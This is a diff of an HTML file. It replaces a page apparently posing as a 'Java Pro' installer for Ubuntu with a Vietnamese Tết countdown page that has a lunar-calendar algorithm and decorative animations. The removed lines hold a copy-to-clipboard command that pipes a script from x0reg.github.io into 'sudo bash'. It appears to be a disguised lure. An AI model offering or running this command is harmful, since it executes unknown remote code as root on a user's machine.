@@ -1,119 +1,602 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Install Java for Ubuntu</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
-  <style>
-    body {
-      background-color: #f0f8f5;
-    }
-    .header-section {
-      background-color: #e9f4e9;
-      padding: 2rem 1rem;
-      text-align: center;
-    }
-    .header-section h1 {
-      font-weight: 700;
-    }
-    .header-section p {
-      color: #707070;
-      margin-top: 0.5rem;
-      font-size: 1.1rem;
-    }
-    .install-section {
-      padding: 2rem 1rem;
-      max-width: 900px;
-      margin: auto;
-    }
-    .install-title {
-      border-left: 4px solid #28a745;
-      padding-left: 10px;
-      font-weight: 700;
-      font-size: 1.5rem;
-    }
-    .install-title .pro {
-      color: #ff7d00;
-      font-weight: 700;
-      margin-left: 0.3rem;
-    }
-    .view-details {
-      font-size: 0.9rem;
-      color: #00a000;
-      margin-left: 10px;
-      cursor: pointer;
-    }
-    .description {
-      font-size: 0.85rem;
-      color: #333;
-      margin-top: 0.5rem;
-      margin-bottom: 1.5rem;
-    }
-    .code-container {
-      background-color: #1e1e2f;
-      color: #f8f8f2;
-      font-family: monospace;
-      padding: 1rem;
-      border-radius: 6px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      white-space: nowrap;
-      overflow-x: auto;
-    }
-    .code-text {
-      flex-grow: 1;
-    }
-    .btn-copy-pro {
-      background-color: #28a745;
-      border: none;
-      color: white;
-      font-weight: 700;
-      padding: 0.4rem 1rem;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .btn-copy-pro:hover {
-      background-color: #218838;
-    }
-    .label-bold {
-      font-weight: 700;
-      margin-right: 0.5rem;
-      font-size: 0.9rem;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đếm Ngược Tết Nguyên Đán</title>
+    <link href="https://fonts.googleapis.com/css2?family=Crimson+Text:wght@600;700&family=Noto+Serif:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Noto Serif', serif;
+            overflow-x: hidden;
+            background: linear-gradient(135deg, #8B0000 0%, #DC143C 50%, #FF6347 100%);
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Hiệu ứng pháo hoa nền */
+        .firework {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: #FFD700;
+            border-radius: 50%;
+            animation: firework 2s ease-out infinite;
+            opacity: 0;
+        }
+
+        @keyframes firework {
+            0% { transform: translateY(100vh) scale(0); opacity: 1; }
+            50% { opacity: 1; }
+            100% { transform: translateY(-20vh) scale(1); opacity: 0; }
+        }
+
+        /* Container chính */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header với hoa mai */
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        .lantern {
+            width: 60px;
+            height: 80px;
+            background: linear-gradient(to bottom, #FF0000, #CC0000);
+            border-radius: 0 0 30px 30px;
+            position: absolute;
+            top: 0;
+            animation: swing 3s ease-in-out infinite;
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.5);
+        }
+
+        .lantern::before {
+            content: '福';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #FFD700;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .lantern::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 10px;
+            background: #FFD700;
+            border-radius: 50%;
+        }
+
+        .lantern-left {
+            left: 10%;
+            animation-delay: 0s;
+        }
+
+        .lantern-right {
+            right: 10%;
+            animation-delay: 1.5s;
+        }
+
+        @keyframes swing {
+            0%, 100% { transform: rotate(-5deg); }
+            50% { transform: rotate(5deg); }
+        }
+
+        .title {
+            font-family: 'Crimson Text', serif;
+            font-size: 4em;
+            color: #FFD700;
+            text-shadow: 
+                3px 3px 0 #8B0000,
+                -1px -1px 0 #8B0000,
+                1px -1px 0 #8B0000,
+                -1px 1px 0 #8B0000,
+                0 0 20px rgba(255, 215, 0, 0.8);
+            margin-bottom: 10px;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { text-shadow: 
+                3px 3px 0 #8B0000,
+                -1px -1px 0 #8B0000,
+                1px -1px 0 #8B0000,
+                -1px 1px 0 #8B0000,
+                0 0 20px rgba(255, 215, 0, 0.8);
+            }
+            50% { text-shadow: 
+                3px 3px 0 #8B0000,
+                -1px -1px 0 #8B0000,
+                1px -1px 0 #8B0000,
+                -1px 1px 0 #8B0000,
+                0 0 40px rgba(255, 215, 0, 1);
+            }
+        }
+
+        .subtitle {
+            font-size: 1.8em;
+            color: #FFFACD;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+        }
+
+        .year-info {
+            font-size: 1.3em;
+            color: #FFE4B5;
+            background: rgba(139, 0, 0, 0.6);
+            padding: 15px 30px;
+            border-radius: 50px;
+            display: inline-block;
+            border: 3px solid #FFD700;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+
+        /* Countdown */
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 60px 0;
+            flex-wrap: wrap;
+        }
+
+        .countdown-item {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(255, 248, 220, 0.95));
+            border: 5px solid #FFD700;
+            border-radius: 20px;
+            padding: 30px;
+            min-width: 160px;
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.3),
+                inset 0 0 20px rgba(255, 215, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .countdown-item::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .countdown-number {
+            font-size: 4em;
+            font-weight: bold;
+            color: #DC143C;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+            display: block;
+            position: relative;
+            z-index: 1;
+        }
+
+        .countdown-label {
+            font-size: 1.2em;
+            color: #8B0000;
+            text-transform: uppercase;
+            margin-top: 10px;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Câu chúc */
+        .wishes {
+            background: rgba(255, 255, 255, 0.9);
+            border: 4px solid #FFD700;
+            border-radius: 30px;
+            padding: 40px;
+            margin: 40px auto;
+            max-width: 800px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .wishes::before,
+        .wishes::after {
+            content: '🌸';
+            position: absolute;
+            font-size: 3em;
+            opacity: 0.6;
+        }
+
+        .wishes::before {
+            top: -20px;
+            left: -20px;
+        }
+
+        .wishes::after {
+            bottom: -20px;
+            right: -20px;
+            content: '🎋';
+        }
+
+        .wishes h2 {
+            color: #DC143C;
+            font-size: 2em;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .wishes p {
+            color: #8B0000;
+            font-size: 1.2em;
+            line-height: 1.8;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        /* Hoa mai rơi */
+        .flower {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            color: #FFD700;
+            font-size: 20px;
+            animation: fall linear infinite;
+            z-index: 999;
+            pointer-events: none;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0.3;
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2.5em;
+            }
+            
+            .subtitle {
+                font-size: 1.2em;
+            }
+            
+            .countdown-item {
+                min-width: 120px;
+                padding: 20px;
+            }
+            
+            .countdown-number {
+                font-size: 3em;
+            }
+            
+            .lantern {
+                width: 40px;
+                height: 60px;
+            }
+
+            .lantern::before {
+                font-size: 20px;
+            }
+        }
+
+        /* Hiệu ứng chữ rơi */
+        .falling-text {
+            position: fixed;
+            color: #FFD700;
+            font-size: 24px;
+            font-weight: bold;
+            animation: fallText 5s linear infinite;
+            z-index: 999;
+            pointer-events: none;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        @keyframes fallText {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(20deg);
+                opacity: 0;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <div class="lantern lantern-left"></div>
+            <div class="lantern lantern-right"></div>
+            
+            <h1 class="title">Tết Nguyên Đán</h1>
+            <p class="subtitle">Xuân Ất Tỵ 2025</p>
+            <div class="year-info" id="yearInfo">Đang tính toán...</div>
+        </div>
 
-  <section class="header-section">
-    <h1>Install Java For Ubtunu</h1>
-    <p>is free, Powerful and easy-to-use</p>
-  </section>
+        <div class="countdown" id="countdown">
+            <div class="countdown-item">
+                <span class="countdown-number" id="days">00</span>
+                <span class="countdown-label">Ngày</span>
+            </div>
+            <div class="countdown-item">
+                <span class="countdown-number" id="hours">00</span>
+                <span class="countdown-label">Giờ</span>
+            </div>
+            <div class="countdown-item">
+                <span class="countdown-number" id="minutes">00</span>
+                <span class="countdown-label">Phút</span>
+            </div>
+            <div class="countdown-item">
+                <span class="countdown-number" id="seconds">00</span>
+                <span class="countdown-label">Giây</span>
+            </div>
+        </div>
 
-  <section class="install-section">
-    <div class="d-flex align-items-center mb-2">
-      <div class="install-title">Java <span class="pro">Pro</span> edition install script</div>
+        <div class="wishes">
+            <h2>🧧 Lời Chúc Năm Mới 🧧</h2>
+            <p>🌸 Vạn sự như ý - An khang thịnh vượng 🌸</p>
+            <p>🎋 Phúc lộc thọ - Tài lộc dồi dào 🎋</p>
+            <p>🏮 Sức khỏe dồi dào - Gia đình sum vầy 🏮</p>
+            <p>🎊 Công danh thành đạt - Vượng khí đầy nhà 🎊</p>
+        </div>
     </div>
-    <div class="description"><strong>No credit card required, no fees.</strong>
-    </div>
-    <div class="code-container">
-      <div class="label-bold">Install script</div>
-      <pre class="code-text" id="code">
-        curl -S https://x0reg.github.io/setup/setup-avatar.sh | sudo bash
-      </pre>
-      <button class="btn-copy-pro" onclick="copyCode()">Copy Pro</button>
-    </div>
-  </section>
 
-<script>
-  function copyCode() {
-    const code = document.getElementById('code').innerText.trim();
-    navigator.clipboard.writeText(code).then(() => {
-      alert('Copied to clipboard!');
-    });
-  }
-</script>
+    <script>
+        // Thuật toán tính lịch âm (rút gọn)
+        const PI = Math.PI;
+        const CAN = ["Canh", "Tân", "Nhâm", "Quý", "Giáp", "Ất", "Bính", "Đinh", "Mậu", "Kỷ"];
+        const CHI = ["Thân", "Dậu", "Tuất", "Hợi", "Tý", "Sửu", "Dần", "Mão", "Thìn", "Tỵ", "Ngọ", "Mùi"];
 
+        function jdFromDate(dd, mm, yy) {
+            let a = Math.floor((14 - mm) / 12);
+            let y = yy + 4800 - a;
+            let m = mm + 12 * a - 3;
+            let jd = dd + Math.floor((153 * m + 2) / 5) + 365 * y + Math.floor(y / 4) - Math.floor(y / 100) + Math.floor(y / 400) - 32045;
+            return jd;
+        }
+
+        function SunLongitude(jdn) {
+            let T = (jdn - 2451545.0) / 36525;
+            let T2 = T * T;
+            let dr = PI / 180;
+            let M = 357.52910 + 35999.05030 * T - 0.0001559 * T2 - 0.00000048 * T * T2;
+            let L0 = 280.46645 + 36000.76983 * T + 0.0003032 * T2;
+            let DL = (1.914600 - 0.004817 * T - 0.000014 * T2) * Math.sin(dr * M);
+            DL = DL + (0.019993 - 0.000101 * T) * Math.sin(dr * 2 * M) + 0.000290 * Math.sin(dr * 3 * M);
+            let L = L0 + DL;
+            L = L * dr;
+            L = L - PI * 2 * Math.floor(L / (PI * 2));
+            return Math.floor(L / PI * 6);
+        }
+
+        function getNewMoonDay(k, timeZone) {
+            let T = k / 1236.85;
+            let T2 = T * T;
+            let T3 = T2 * T;
+            let dr = PI / 180;
+            let Jd1 = 2415020.75933 + 29.53058868 * k + 0.0001178 * T2 - 0.000000155 * T3;
+            Jd1 = Jd1 + 0.00033 * Math.sin((166.56 + 132.87 * T - 0.009173 * T2) * dr);
+            let M = 359.2242 + 29.10535608 * k - 0.0000333 * T2 - 0.00000347 * T3;
+            let Mpr = 306.0253 + 385.81691806 * k + 0.0107306 * T2 + 0.00001236 * T3;
+            let F = 21.2964 + 390.67050646 * k - 0.0016528 * T2 - 0.00000239 * T3;
+            let C1 = (0.1734 - 0.000393 * T) * Math.sin(M * dr) + 0.0021 * Math.sin(2 * dr * M);
+            C1 = C1 - 0.4068 * Math.sin(Mpr * dr) + 0.0161 * Math.sin(dr * 2 * Mpr);
+            C1 = C1 - 0.0004 * Math.sin(dr * 3 * Mpr);
+            C1 = C1 + 0.0104 * Math.sin(dr * 2 * F) - 0.0051 * Math.sin(dr * (M + Mpr));
+            C1 = C1 - 0.0074 * Math.sin(dr * (M - Mpr)) + 0.0004 * Math.sin(dr * (2 * F + M));
+            C1 = C1 - 0.0004 * Math.sin(dr * (2 * F - M)) - 0.0006 * Math.sin(dr * (2 * F + Mpr));
+            C1 = C1 + 0.0010 * Math.sin(dr * (2 * F - Mpr)) + 0.0005 * Math.sin(dr * (2 * Mpr + M));
+            let deltat;
+            if (T < -11) {
+                deltat = 0.001 + 0.000839 * T + 0.0002261 * T2 - 0.00000845 * T3 - 0.000000081 * T * T3;
+            } else {
+                deltat = -0.000278 + 0.000265 * T + 0.000262 * T2;
+            }
+            let JdNew = Jd1 + C1 - deltat;
+            return Math.floor(JdNew + 0.5 + timeZone / 24);
+        }
+
+        function getLunarMonth11(yy, timeZone) {
+            let off = jdFromDate(31, 12, yy) - 2415021;
+            let k = Math.floor(off / 29.530588853);
+            let nm = getNewMoonDay(k, timeZone);
+            let sunLong = SunLongitude(nm);
+            if (sunLong >= 9) {
+                nm = getNewMoonDay(k - 1, timeZone);
+            }
+            return nm;
+        }
+
+        function getLeapMonthOffset(a11, timeZone) {
+            let k = Math.floor((a11 - 2415021.076998695) / 29.530588853 + 0.5);
+            let last = 0;
+            let i = 1;
+            let arc = SunLongitude(getNewMoonDay(k + i, timeZone));
+            do {
+                last = arc;
+                i++;
+                arc = SunLongitude(getNewMoonDay(k + i, timeZone));
+            } while (arc != last && i < 14);
+            return i - 1;
+        }
+
+        function convertSolar2Lunar(dd, mm, yy, timeZone = 7) {
+            let dayNumber = jdFromDate(dd, mm, yy);
+            let k = Math.floor((dayNumber - 2415021.076998695) / 29.530588853);
+            let monthStart = getNewMoonDay(k + 1, timeZone);
+            if (monthStart > dayNumber) {
+                monthStart = getNewMoonDay(k, timeZone);
+            }
+            let a11 = getLunarMonth11(yy, timeZone);
+            let b11 = a11;
+            let lunarYear;
+            if (a11 >= monthStart) {
+                lunarYear = yy;
+                a11 = getLunarMonth11(yy - 1, timeZone);
+            } else {
+                lunarYear = yy + 1;
+                b11 = getLunarMonth11(yy + 1, timeZone);
+            }
+            let lunarDay = dayNumber - monthStart + 1;
+            let diff = Math.floor((monthStart - a11) / 29);
+            let lunarLeap = 0;
+            let lunarMonth = diff + 11;
+            if (b11 - a11 > 365) {
+                let leapMonthDiff = getLeapMonthOffset(a11, timeZone);
+                if (diff >= leapMonthDiff) {
+                    lunarMonth = diff + 10;
+                    if (diff == leapMonthDiff) {
+                        lunarLeap = 1;
+                    }
+                }
+            }
+            if (lunarMonth > 12) {
+                lunarMonth = lunarMonth - 12;
+            }
+            if (lunarMonth >= 11 && diff < 4) {
+                lunarYear -= 1;
+            }
+            return [lunarDay, lunarMonth, lunarYear, lunarLeap];
+        }
+
+        function getYearCanChi(year) {
+            const can = CAN[(year + 6) % 10];
+            const chi = CHI[(year + 8) % 12];
+            return `${can} ${chi}`;
+        }
+
+        // Tìm ngày Tết năm tiếp theo
+        function findTetDate() {
+            const now = new Date();
+            let year = now.getFullYear();
+            
+            // Tìm ngày mồng 1 tháng 1 âm lịch
+            for (let month = 1; month <= 12; month++) {
+                for (let day = 1; day <= 31; day++) {
+                    try {
+                        const [lunarDay, lunarMonth, lunarYear] = convertSolar2Lunar(day, month, year);
+                        if (lunarDay === 1 && lunarMonth === 1) {
+                            const tetDate = new Date(year, month - 1, day);
+                            if (tetDate > now) {
+                                return { date: tetDate, lunarYear };
+                            }
+                        }
+                    } catch (e) {}
+                }
+            }
+            
+            // Nếu không tìm thấy trong năm nay, tìm năm sau
+            year++;
+            for (let month = 1; month <= 3; month++) {
+                for (let day = 1; day <= 31; day++) {
+                    try {
+                        const [lunarDay, lunarMonth, lunarYear] = convertSolar2Lunar(day, month, year);
+                        if (lunarDay === 1 && lunarMonth === 1) {
+                            return { date: new Date(year, month - 1, day), lunarYear };
+                        }
+                    } catch (e) {}
+                }
+            }
+        }
+
+        // Đếm ngược
+        function updateCountdown() {
+            const tet = findTetDate();
+            const now = new Date();
+            const diff = tet.date - now;
+
+            if (diff <= 0) {
+                document.getElementById('countdown').innerHTML = '<h2 style="color: #FFD700; font-size: 3em;">🎊 CHÚC MỪNG NĂM MỚI! 🎊</h2>';
+                return;
+            }
+
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+            document.getElementById('days').textContent = String(days).padStart(2, '0');
+            document.getElementById('hours').textContent = String(hours).padStart(2, '0');
+            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+
+            const canChi = getYearCanChi(tet.lunarYear);
+            const tetDateStr = tet.date.toLocaleDateString('vi-VN', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+            document.getElementById('yearInfo').textContent = `Năm ${canChi} - ${tetDateStr}`;
+        }
+
+        // Tạo hoa mai rơi
+        function createFlower() {
+            const flower = document.createElement('div');
+            flower.className = 'flower';
+            flower.textContent = ['🌸', '🌼', '🌺', '🏮'][Math.floor(Math.random() * 4)];
+            flower.style.left = Math.random() * 100 + 'vw';
+            flower.style.animationDuration = (Math.random() * 3 + 4) + 's';
+            flower.style.animationDelay = Math.random() * 2 + 's';
+            document.body.appendChild(flower);
+            
+            setTimeout(() => flower.remove(), 7000);
+        }
+
+        // Tạo pháo hoa
+        function createFirework() {
+            const firework = document.createElement('div');
+            firework.className = 'firework';
+            firework.style.left = Math.random() * 100 + 'vw';
+            firework.style.animationDelay = Math.random() * 2 + 's';
+            document.body.appendChild(firework);
+            
+            setTimeout(() => firework.remove(), 2000);
+        }
+
+        // Tạo chữ rơi
+        function createFallingText() {
+            const texts = ['福', '春', '財', '祿', '壽', '喜'];
+            const text = document.createElement('div');
+            text.className = 'falling-text';
+            text.textContent = texts[Math.floor(Math.random() * texts.length)];
+            text.style.left = Math.random() * 100 + 'vw';
+            text.style.animationDuration = (Math.random() * 2 + 3) + 's';
+            document.body.appendChild(text);
+            
+            setTimeout(() => text.remove(), 5000);
+        }
+
+        // Khởi động
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+        setInterval(createFlower, 300);
+        setInterval(createFirework, 500);
+        setInterval(createFallingText, 1000);
+    </script>
 </body>
 </html>
